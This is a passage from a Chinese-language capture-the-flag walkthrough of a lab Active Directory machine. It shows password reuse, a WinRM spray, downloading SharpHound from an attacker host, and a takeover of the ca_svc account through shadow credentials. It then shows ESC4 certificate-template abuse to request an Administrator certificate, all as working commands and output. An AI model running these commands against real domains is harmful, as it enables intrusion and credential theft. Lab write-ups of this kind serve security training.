-a----         4/3/2024   3:48 PM          95504 SqlCommonObjects.xml                                                  
-a----         4/3/2024   3:48 PM            619 SqlProductions.xml                                                    
-a----         4/3/2024   3:48 PM          15539 SqlTemplateData.xml                                                   
-a----         4/3/2024   3:48 PM         609757 StoredProcedures.xml
...
    Directory: C:\SQL2019\ExpressAdv_ENU\1033_ENU_LP


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/24/2019   5:57 PM            207 MEDIAINFO.XML                                                         


    Directory: C:\SQL2019\ExpressAdv_ENU\x64


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/24/2019   5:20 PM          12028 ADDNODE.XML                                                           
-a----        9/24/2019   5:20 PM          11893 COMPLETECLUSTERWIZARD.XML                                             
-a----        9/24/2019   5:20 PM          15305 COMPLETEIMAGEWIZARD.XML                                               
-a----        9/24/2019   5:20 PM           3061 COMPONENTUPDATE.XML                                                   
-a----        9/24/2019   5:20 PM           5673 EDITIONUPGRADEWIZARD.XML                                              
-a----        9/24/2019   5:20 PM            486 FIXSQLREGISTRYKEY_X64.EXE.CONFIG                                      
-a----        9/24/2019   5:20 PM            486 FIXSQLREGISTRYKEY_X86.EXE.CONFIG                                      
-a----        9/24/2019   5:20 PM          19950 INSTALLCLUSTERWIZARD.XML                                              
-a----        9/24/2019   5:20 PM          20522 INSTALLWIZARD.XML                                                     
-a----        9/24/2019   5:20 PM            486 LANDINGPAGE.EXE.CONFIG                                                
-a----        9/24/2019   5:20 PM          92538 PIDPRIVATECONFIGOBJECTMAPS.XML                                        
-a----        9/24/2019   5:20 PM          13679 PREPARECLUSTERWIZARD.XML                                              
-a----        9/24/2019   5:20 PM           8698 PREPAREIMAGEWIZARD.XML                                                
-a----        9/24/2019   5:20 PM           4946 REMOVENODE.XML                                                        
-a----        9/24/2019   5:20 PM           6999 REPAIRWIZARD.XML                                                      
-a----        9/24/2019   5:20 PM           1403 RUNRULESUI.XML                                                        
-a----        9/24/2019   5:20 PM            486 SCENARIOENGINE.EXE.CONFIG                                             
-a----        9/24/2019   5:20 PM           4648 UNINSTALLWIZARD.XML                                                   
-a----        9/24/2019   5:20 PM          14573 UPGRADEWIZARD.XML                                                     


    Directory: C:\SQL2019\ExpressAdv_ENU


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML                                                         
-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG                                                      
-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI                                                 
...
```
> 檔案太多，跳過系統設定、Bootstrap、Binary 等等

🕛🕧🕐🕜🕑🕝🕒⏰...\
在 `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` 找到 SQL Server 安裝設定檔\
找到可用資訊：
```
PS C:\Windows\system32> type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysD*****"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```
> `SEQUEL\sql_svc`：`WqSZAF6CysD*****`
> `sa`：`MSSQLP@ssw0rd!` (已知)

### 5. 嘗試登入 WinRM
- 嘗試 `SEQUEL\sql_svc`：`WqSZAF6CysD*****`
```
┌──(chw㉿CHW)-[~]
└─$ crackmapexec winrm 10.10.11.51 -u sql_svc -p 'WqSZAF6CysD*****' -d sequel.htb
...
HTTP        10.10.11.51     5985   10.10.11.51      [*] http://10.10.11.51:5985/wsman
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\sql_svc:WqSZAF6CysD*****
```
> `SEQUEL\sql_svc`：`WqSZAF6CysD*****`：失敗

- 嘗試 `EscapeTwo_name.txt`：`WqSZAF6CysD*****`
嘗試前面建立的 Userlist: `EscapeTwo_name.txt`\
(SMB File Leak 找到的 User)
```
┌──(chw㉿CHW)-[~]
└─$ crackmapexec winrm 10.10.11.51 -u EscapeTwo_name.txt -p 'WqSZAF6CysD*****' -d sequel.htb 
...
HTTP        10.10.11.51     5985   10.10.11.51      [*] http://10.10.11.51:5985/wsman
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\sa:WqSZAF6CysD*****
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\angela:WqSZAF6CysD*****
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\oscar:WqSZAF6CysD*****
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\kevin:WqSZAF6CysD*****

```
> `EscapeTwo_name.txt`：`WqSZAF6CysD*****`：失敗

#### 5.1  爆破 SMB RID 
```
┌──(chw㉿CHW)-[~]
└─$ crackmapexec smb 10.10.11.51 -u "rose" -p "KxEPkKe6R8su" --rid-brute  
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [+] Brute forcing RIDs
SMB         10.10.11.51     445    DC01             498: SEQUEL\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             500: SEQUEL\Administrator (SidTypeUser)
SMB         10.10.11.51     445    DC01             501: SEQUEL\Guest (SidTypeUser)
SMB         10.10.11.51     445    DC01             502: SEQUEL\krbtgt (SidTypeUser)
SMB         10.10.11.51     445    DC01             512: SEQUEL\Domain Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             513: SEQUEL\Domain Users (SidTypeGroup)
SMB         10.10.11.51     445    DC01             514: SEQUEL\Domain Guests (SidTypeGroup)
SMB         10.10.11.51     445    DC01             515: SEQUEL\Domain Computers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             516: SEQUEL\Domain Controllers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             517: SEQUEL\Cert Publishers (SidTypeAlias)
SMB         10.10.11.51     445    DC01             518: SEQUEL\Schema Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             519: SEQUEL\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             520: SEQUEL\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.51     445    DC01             521: SEQUEL\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             522: SEQUEL\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.51     445    DC01             525: SEQUEL\Protected Users (SidTypeGroup)
SMB         10.10.11.51     445    DC01             526: SEQUEL\Key Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             527: SEQUEL\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.51     445    DC01             553: SEQUEL\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.51     445    DC01             571: SEQUEL\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.51     445    DC01             572: SEQUEL\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.51     445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)
SMB         10.10.11.51     445    DC01             1101: SEQUEL\DnsAdmins (SidTypeAlias)
SMB         10.10.11.51     445    DC01             1102: SEQUEL\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1103: SEQUEL\michael (SidTypeUser)
SMB         10.10.11.51     445    DC01             1114: SEQUEL\ryan (SidTypeUser)
SMB         10.10.11.51     445    DC01             1116: SEQUEL\oscar (SidTypeUser)
SMB         10.10.11.51     445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)
SMB         10.10.11.51     445    DC01             1128: SEQUEL\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.51     445    DC01             1129: SEQUEL\SQLRUserGroupSQLEXPRESS (SidTypeAlias)
SMB         10.10.11.51     445    DC01             1601: SEQUEL\rose (SidTypeUser)
SMB         10.10.11.51     445    DC01             1602: SEQUEL\Management Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1603: SEQUEL\Sales Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1604: SEQUEL\Accounting Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1605: SEQUEL\Reception Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1606: SEQUEL\Human Resources Department (SidTypeGroup)
SMB         10.10.11.51     445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)

```
>Domain `SEQUEL\` Userlist:\
Administrator（RID: 500）\
Guest（RID: 501）\
krbtgt（RID: 502）\
DC01$（RID: 1000）\
michael（RID: 1103）\
ryan（RID: 1114）\
oscar（RID: 1116）\
sql_svc（RID: 1122）\
rose（RID: 1601）\
ca_svc（RID: 1607）

建立 userlist 嘗試 WinRM
```
┌──(chw㉿CHW)-[~]
└─$ cat EscapeTwo_smb.txt                                             
Administrator
Guest
krbtgt
DC01$
michael
ryan
oscar
sql_svc
rose
ca_svc
                                                                   
┌──(chw㉿CHW)-[~]
└─$ crackmapexec winrm 10.10.11.51 -u EscapeTwo_smb.txt -p 'WqSZAF6CysD*****' -d sequel.htb 
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\ '
  formatter_class=RawTextHelpFormatter)
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
HTTP        10.10.11.51     5985   10.10.11.51      [*] http://10.10.11.51:5985/wsman
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\Administrator:WqSZAF6CysD*****
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\Guest:WqSZAF6CysD*****
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\krbtgt:WqSZAF6CysD*****
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\DC01$:WqSZAF6CysD*****
WINRM       10.10.11.51     5985   10.10.11.51      [-] sequel.htb\michael:WqSZAF6CysD*****
WINRM       10.10.11.51     5985   10.10.11.51      [+] sequel.htb\ryan:WqSZAF6CysD*****3 (Pwn3d!)
```
> 成功取得 WinRM:\
> `sequel.htb\ryan`:`WqSZAF6CysD*****`

#### 5.2 登入 WinRM
```
┌──(chw㉿CHW)-[~]
└─$ evil-winrm -i 10.10.11.51 -u 'sequel.htb\ryan' -p 'WqSZAF6CysD*****'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> 
```

### ✅ Get User Flag
> 在 `\Users\ryan\Desktop` 找到 User flag

## Privileges Escalation

### 7. 確認 User 資訊
```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\ryan\Documents> net user ryan /domain
User name                    ryan
Full Name                    Ryan Howard
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/8/2024 9:55:45 AM
Password expires             Never
Password changeable          6/9/2024 9:55:45 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/9/2024 10:16:26 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Management Department*Domain Users
The command completed successfully.
```

### 8. BloodHoud
SharpHound 掃描
```
*Evil-WinRM* PS C:\Users\ryan\Desktop> iwr http://10.10.14.179/SharpHound.ps1 -OutFile SharpHound.ps1 -UseBasicParsing
*Evil-WinRM* PS C:\Users\ryan\Desktop> . .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\ryan\Desktop> Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\ryan\Desktop"
*Evil-WinRM* PS C:\Users\ryan\Desktop> ls


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/7/2025   9:20 PM          12342 20250507212055_BloodHound.zip
-a----         5/7/2025   9:21 PM          12374 20250507212157_BloodHound.zip
-a----         5/7/2025   9:21 PM           9503 NGZlZGJhNTUtZGMxZi00MzRhLTkxYzUtZWNjYjM1NGU4YzNl.bin
-a----         5/7/2025   9:14 PM        1308348 SharpHound.ps1
-ar---         5/7/2025   6:27 AM             34 user.txt

*Evil-WinRM* PS C:\Users\ryan\Desktop> download 20250507212157_BloodHound.zip
                                        
Info: Downloading C:\Users\ryan\Desktop\20250507212157_BloodHound.zip to 20250507212157_BloodHound.zip
                                        
Info: Download successful!

```
BloodHound 分析
- 標記 User as Owned
![image](https://hackmd.io/_uploads/r1VDz6Yeee.png)
> `sql_svc` & `Ryan`
- 查看 Owned User 權限
Ryan 有 `ca_svc` 的 WriteOwner 權限\
![image](https://hackmd.io/_uploads/SJC1Natxlg.png)
( `ca_svc` 是 CERT PUBLISHERS)

### 9. Shadow Credentials Attack
🎯 利用 `ca_svc` 取得 Kerberos 憑證，再用憑證發動 AD CS 提權給 Administrator。

利用 ryan 冒充 ca_svc 身分，嘗試取得 Kerberos TGT 與 NTLM Hash
```
┌──(chw㉿CHW)-[~]
└─$ certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysD*****' -account ca_svc -dc-ip 10.10.11.51

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '59bf8f52-d75b-2973-8d51-************'
[*] Adding Key Credential with device ID '59bf8f52-d75b-2973-8d51-************' to the Key Credentials for 'ca_svc'
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0

```
> 試用 Certipy shadow add 失敗，因為 AD 不允許直接修改 `msDS-KeyCredentialLink`

>[!Important]
> `certipy shadow` cmd 實際行為：
> 1. 產生一張自簽憑證（certificate + private key）。
> 2. 將此憑證轉換為 KeyCredential 格式。
> 3. 嘗試將 KeyCredential 注入至 `ca_svc` 帳號的 `msDS-KeyCredentialLink` 屬性：\
等同「將 ca_svc 加了一把萬用鑰匙」。 
> 4. 使用這把憑證進行 Kerberos PKINIT 認證 → 嘗試取得 ca_svc 的 TGT。
> 5. 嘗試使用 TGT 去 dump 出 ca_svc 的 NTLM Hash。
> 最後自動 還原原始 KeyCredential，清除痕跡。


#### 9.1 更改 `ca_svc` Object Owner
使用 bloodyAD 把 ca_svc 的 Owner 改成 ryan\
(Ryan 有 `ca_svc` 的 WriteOwner 權限)
```
┌──(chw㉿CHW)-[~]
└─$ bloodyAD -d sequel.htb --dc-ip 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysD*****' set owner 'ca_svc' 'ryan'

[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
```
> 將 `ca_svc` 的 Owner 換成 `ryan`
>> Owner 才能後續修改 ACL

#### 9.2 操控 DACL → 取得完整控制權
擁有 Owner 還是無法直接修改 DACL 權限，需使用 dacledit 把 FullControl 權限加入 DACL，才可讓 ryan 對該物件有實質操作權限。

使用 impacket-dacledit 賦予 ryan 完整 DACL 權限
```          
┌──(chw㉿CHW)-[~]
└─$ impacket-dacledit -action write -principal ryan -target ca_svc -dc-ip 10.10.11.51 sequel.htb/ryan:WqSZAF6CysD*****

/usr/share/doc/python3-impacket/examples/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/share/doc/python3-impacket/examples/dacledit.py:110: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:111: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:112: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/share/doc/python3-impacket/examples/dacledit.py:114: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:115: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:116: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/share/doc/python3-impacket/examples/dacledit.py:117: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:118: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:120: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/share/doc/python3-impacket/examples/dacledit.py:121: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:123: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:124: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:125: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/share/doc/python3-impacket/examples/dacledit.py:126: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:127: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250508-024050.bak
[*] DACL modified successfully!

```
> **現在 `ryan` 可以寫入 `ca_svc` Object 的任何屬性**

#### 9.3 再次嘗試 Shadow Credentials Attack 
```
┌──(chw㉿CHW)-[~]
└─$ certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysD*****' -account ca_svc -dc-ip 10.10.11.51                

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7b8b6175-3afc-7a5a-59d9-9d6ae12a492a'
[*] Adding Key Credential with device ID '7b8b6175-3afc-7a5a-59d9-9d6ae12a492a' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '7b8b6175-3afc-7a5a-59d9-9d6ae12a492a' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e**********

```
> Dump 出 `ca_svc` 的 NTLM hash

### 10. AD CS template vul（ESC4）

#### 10.1 列出 ADCS 設定
憑證授權中心（CA）、憑證模板（Certificate Templates）

>[!important]
尋找是否存在已知的 ADCS 漏洞，ex：
`ESC1`：低權限使用者可以註冊證書
`ESC4`：擁有對模板的 FullControl（可修改來假冒高權限帳號）
`ESC6`：允許任意使用者指定 UPN

```
┌──(chw㉿CHW)-[~]
└─$ certipy find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e********** -dc-ip 10.10.11.51 -vulnerable

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250508031445_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250508031445_Certipy.txt'
[*] Saved JSON output to '20250508031445_Certipy.json'
```
查看內容：
```
┌──(chw㉿CHW)-[~]
└─$ cat 20250508031445_Certipy.txt
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```
>Full Control Principals：Cert Publishers
>`ca_svc` 剛好就是 Cert Publishers 的成員 ，因此可以修改模板 ACL & 屬性。
>> ESC4 漏洞 

>[!Note]
>**ADCS – ESC4**\
模板名稱：DunderMifflinAuthentication\
漏洞描述：SEQUEL.HTB\Cert Publishers 對該 template 擁有 Full Control\
👉🏻 `ca_svc` 是 Cert Publishers 成員，因此可以重寫 template 內容並發證給 Administrator

#### 10.2 修改 Certificate Templates
修改 `DunderMifflinAuthentication` 內容，讓它變成可被濫用的 Certificate Templates

>[!Tip]
>由 Certipy 自動處理：\
>✅ 移除不必要的 EKU 限制（如僅 Client Auth）\
>✅ 關閉管理員核准（msPKI-Enrollment-Flag）\
>✅ 啟用 SubjectAltName 的 UPN 設定（允許自定目標帳號）\
>✅ 確保允許「enrollee supplies subject」\
>✅ 調整 ACL 權限（如果需要）
```
┌──(chw㉿CHW)-[~]
└─$ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e********** -template DunderMifflinAuthentication -target DC01.sequel.htb -dc-ip 10.10.11.51 -debug 

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
[+] Authenticating to LDAP server
[+] Bound to ldaps://10.10.11.51:636 - ssl
[+] Default path: DC=sequel,DC=htb
[+] Configuration path: CN=Configuration,DC=sequel,DC=htb
[*] Updating certificate template 'DunderMifflinAuthentication'
[+] MODIFY_DELETE:
[+]     pKIExtendedKeyUsage: []
[+]     msPKI-Certificate-Application-Policy: []
[+] MODIFY_REPLACE:
[+]     nTSecurityDescriptor: [b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xc8\xa3\x1f\xdd\xe9\xba\xb8\x90,\xaes\xbb\xf4\x01\x00\x00']
[+]     flags: [b'0']
[+]     pKIDefaultKeySpec: [b'2']
[+]     pKIKeyUsage: [b'\x86\x00']
[+]     pKIMaxIssuingDepth: [b'-1']
[+]     pKICriticalExtensions: [b'2.5.29.19', b'2.5.29.15']
[+]     pKIExpirationPeriod: [b'\x00@\x1e\xa4\xe8e\xfa\xff']
[+]     pKIDefaultCSPs: [b'1,Microsoft Enhanced Cryptographic Provider v1.0']
[+]     msPKI-Enrollment-Flag: [b'0']
[+]     msPKI-Private-Key-Flag: [b'16842768']
[+]     msPKI-Certificate-Name-Flag: [b'1']
[*] Successfully updated 'DunderMifflinAuthentication'
```
#### 10.3 以惡意 template 請求 Administrator 憑證
以 `ca_svc` 身分，透過修改後的惡意 template，偽造 Administrator 的憑證（.pfx）
```
┌──(chw㉿CHW)-[~]
└─$ certipy req \
  -u ca_svc@sequel.htb \                          
  -hashes 3b181b914e7a9d5508ea1e********** \
  -ca sequel-DC01-CA \
  -template DunderMifflinAuthentication \
  -upn Administrator@sequel.htb \
  -dc-ip 10.10.11.51 \
  -out Administrator.pfx

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
